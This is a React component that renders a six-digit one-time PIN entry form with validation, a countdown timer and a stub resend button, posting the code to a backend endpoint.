import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css"; // Add your general styles here
import "../styles/pin.css"; // Specific styles for PIN input
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import BASE_URL from "../components/urls";

// Validation schema
const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });
  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [timer, setTimer] = useState(30); // Timer state

  // Countdown timer effect
  useEffect(() => {
    if (timer === 0) return; // Stop when timer reaches 0

    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(interval); // Cleanup interval on unmount
  }, [timer]);

  useEffect(() => {
    // Get phone number from local storage
    const storedPhoneNumber = localStorage.getItem("userPhoneNumber");
    if (storedPhoneNumber) {
      setPhoneNumber(storedPhoneNumber);
    }
  }, []);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
        setOtp(new Array(6).fill(""));
        setValue("otp", "");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const handleResend = () => {
    // Logic for resending the OTP can go here
    console.log("Resending OTP...");
    setTimer(30); // Reset timer after resending OTP
  };

  return (
    <div className="pin-container">
      <div className="pin-wrapper">
        <h1 className="pin-title">
          One-time <span className="pin-highlight">PIN</span>
        </h1>
        <p className="pin-subtitle">
          Please enter the one-time PIN (OTP) that we sent to {phoneNumber}
        </p>

        <form className="pin-form" onSubmit={handleSubmit(submitForm)}>
          <div className="pin-input-wrapper">
            {otp.map((data, index) => (
              <input
                key={index}
                id={`otp-${index}`}
                type="password"
                maxLength="1"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="pin-input"
                inputMode="numeric"
              />
            ))}
          </div>

          {errors.otp && <div className="pin-error">{errors.otp.message}</div>}

          <button
            type="submit"
            className="pin-submit-button"
            disabled={loading}
          >
            {loading ? "Loading..." : "Verify"}
          </button>

          <p className="pin-resend">
            Resend code in {timer} seconds...
            {timer === 0 && (
              <button onClick={handleResend} className="resend-button">
                Resend
              </button>
            )}
          </p>
        </form>
      </div>
    </div>
  );
};

export default Pin;
